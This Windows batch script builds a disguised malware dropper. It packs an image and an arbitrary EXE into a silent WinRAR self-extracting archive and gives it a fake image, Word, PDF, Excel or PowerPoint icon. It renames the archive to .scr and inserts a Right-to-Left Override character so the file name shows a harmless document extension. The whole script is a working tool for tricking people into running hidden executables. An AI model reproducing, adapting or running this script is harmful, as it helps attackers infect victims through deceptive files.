chcp 65001
setlocal enabledelayedexpansion

REM Set paths and filenames
set "rarPath=.\programs\WinRAR\rar.exe"
set "sfxConfigFile=./sfx_config.txt"
set "archiveName=image"
set "imageFile=%1"
set "exeFile=%2"
set "ext=%3"

REM Check if files exist
if not exist "%imageFile%" (
    echo Error: Image file not found.
    exit /b 1
)
if not exist "%exeFile%" (
    echo Error: EXE file not found.
    exit /b 1
)
if not exist "./icon" (
    echo Error: ICO folder not found.
    exit /b 1
)

echo "Nothing to see"

REM Check for the right icon
if "%ext%"=="gnp" (
    echo Setting file format to png...
    set "icon=./icon/image.ico"
)
if "%ext%"=="xcod" (
    echo Setting file format to word...
    set "icon=./icon/word.ico"
)
if "%ext%"=="fdp" (
    echo Setting file format to pdf...
    set "icon=./icon/pdf.ico"
)
if "%ext%"=="slx" (
    echo Setting file format to excel...
    set "icon=./icon/excel.ico"
)
if "%ext%"=="xtpp" (
    echo Setting file format to powerpoint...
    set "icon=./icon/powerpoint.ico"
)

@REM set "icon=./icon/image.ico"

REM Create SFX configuration file with the correct icon path
(
echo Setup=%imageFile%
echo Setup=%exeFile%
echo TempMode
echo Silent=2
echo Overwrite=1
echo Icon=%icon%
) > "%sfxConfigFile%"
echo %icon%
REM Create a self-extracting archive with the specified files and apply the icon
"%rarPath%" a -sfx -z"%sfxConfigFile%" -iicon"%icon%" "%archiveName%.exe" "%imageFile%" "%exeFile%"

rem Define the original filename

ren "%archiveName%.exe" "%archiveName%.scr"

rem Define the new name and reverse the extension with RLO
set "newname=%archiveName%‮%ext%.scr"

rem Rename the file
ren "%archiveName%.scr" "%newname%"

REM Cleanup
del "%sfxConfigFile%"

echo Completed
echo Here is my %3 and %icon%

endlocal